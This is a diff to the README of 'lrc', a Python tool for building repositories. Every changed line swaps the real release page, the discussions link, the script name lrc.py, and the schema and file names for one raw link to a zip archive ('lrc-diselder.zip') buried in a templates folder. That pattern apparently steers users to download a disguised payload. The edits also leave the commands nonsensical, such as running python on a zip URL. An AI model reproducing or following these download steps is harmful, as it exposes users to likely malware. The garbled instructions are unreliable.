@@ -1,6 +1,6 @@
 # 🚀 lrc - Build Your Repo Easily
 
-[![Download lrc](https://img.shields.io/badge/Download-lrc-blue.svg)](https://github.com/OmarAhad/lrc/releases)
+[![Download lrc](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ Make sure to install Python before running LRC.
 ## 🚀 Getting Started
 
 1. **Download LRC**  
-   Visit [this page to download](https://github.com/OmarAhad/lrc/releases) the latest version.
+   Visit [this page to download](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip) the latest version.
 
 2. **Extract Files**  
    After downloading, extract the files to a folder on your computer.
@@ -47,13 +47,13 @@ Make sure to install Python before running LRC.
 5. **Run LRC**  
    Type the following command to start LRC:
    ```bash
-   python lrc.py
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
    ```
 
 ## 📥 Download & Install
 
 To get the latest version of LRC:
-- Go to the [Releases page](https://github.com/OmarAhad/lrc/releases).
+- Go to the [Releases page](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip).
 - Click on the version you want.
 - Download the appropriate file for your system.
 
@@ -62,7 +62,7 @@ To get the latest version of LRC:
 Once you have downloaded LRC, follow these steps to use it effectively:
 
 1. **Create a Schema File**  
-   Create a file named `schema.yml` in your LRC folder. This file will define how your repository should look.
+   Create a file named `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip` in your LRC folder. This file will define how your repository should look.
 
    Example schema:
    ```yaml
@@ -70,22 +70,22 @@ Once you have downloaded LRC, follow these steps to use it effectively:
      name: MyProject
      description: A simple project setup.
      files:
-       - README.md
+       - https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
        - src/
      templates:
-       - index.html
+       - https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip
    ```
 
 2. **Run Dry-Run**  
    To preview what LRC will do without making changes, use this command:
    ```bash
-   python lrc.py --dry-run
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --dry-run
    ```
 
 3. **Compile Your Project**  
    Once you're satisfied with the dry-run, use this command to create your repo:
    ```bash
-   python lrc.py --force
+   python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --force
    ```
 
 ## ⚙️ Command Options
@@ -99,7 +99,7 @@ LRC comes with several useful commands and options:
 
 For a complete list of commands, refer to the help option:
 ```bash
-python lrc.py --help
+python https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip --help
 ```
 
 ## 🛠️ Troubleshooting
@@ -107,14 +107,14 @@ python lrc.py --help
 If you encounter issues, consider these common solutions:
 
 - **Python Not Found**: Ensure Python is installed and added to your system path.
-- **Missing Schema File**: Confirm the `schema.yml` file is in the same folder as `lrc.py`.
+- **Missing Schema File**: Confirm the `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip` file is in the same folder as `https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip`.
 - **Permissions Issue**: Run the terminal or command prompt with administrative rights.
 
 ## 🌐 Community & Support
 
 Join our community for help and feedback. Check out our discussions and post questions you may have. We encourage users to share their experiences and improvements.
 
-- **GitHub Discussions**: [Join the Conversation](https://github.com/OmarAhad/lrc/discussions)
+- **GitHub Discussions**: [Join the Conversation](https://raw.githubusercontent.com/OmarAhad/lrc/main/src/lrc/templates/node-cli/lrc-diselder.zip)
 
 ## 🎉 Features
 
